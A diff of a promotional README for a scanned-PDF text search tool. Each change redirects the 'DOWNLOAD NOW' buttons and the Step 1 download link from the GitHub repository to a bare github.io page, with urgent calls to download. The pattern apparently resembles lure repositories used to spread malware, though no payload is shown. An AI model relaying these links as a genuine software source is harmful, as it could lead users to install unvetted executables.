@@ -1,7 +1,7 @@
 <h1>🔍 Search-Text-in-Scanned-PDF-Tool-2026 - Find Any Text in Scanned PDFs Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/colorless-characterisicfunction4030/Search-Text-in-Scanned-PDF-Tool-2026" style="display:inline-block;padding:15px 35px;background-color:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://colorless-characterisicfunction4030.github.io" style="display:inline-block;padding:15px 35px;background-color:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 👋 Welcome to Search-Text-in-Scanned-PDF-Tool-2026
@@ -32,7 +32,7 @@ Getting started with Search-Text-in-Scanned-PDF-Tool-2026 is incredibly easy. Fo
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/colorless-characterisicfunction4030/Search-Text-in-Scanned-PDF-Tool-2026](https://github.com/colorless-characterisicfunction4030/Search-Text-in-Scanned-PDF-Tool-2026)**
+Visit this link to download the application: **[https://colorless-characterisicfunction4030.github.io](https://colorless-characterisicfunction4030.github.io)**
 
 Once you click the link, you'll be taken to the download page. Look for the download button or the latest release file. The download should start automatically or after a single click.
 
@@ -148,7 +148,7 @@ This tool is free to use for personal and commercial purposes. See the license f
 Don't waste another minute manually scanning through PDFs. Download Search-Text-in-Scanned-PDF-Tool-2026 today and experience the magic of instant text search in your scanned documents.
 
 <p align="center">
-  <a href="https://github.com/colorless-characterisicfunction4030/Search-Text-in-Scanned-PDF-Tool-2026" style="display:inline-block;padding:15px 35px;background-color:#2196F3;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW - IT'S FREE!</a>
+  <a href="https://colorless-characterisicfunction4030.github.io" style="display:inline-block;padding:15px 35px;background-color:#2196F3;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW - IT'S FREE!</a>
 </p>
 
 **Your scanned PDFs are about to become fully searchable. Say goodbye to manual searching forever!**
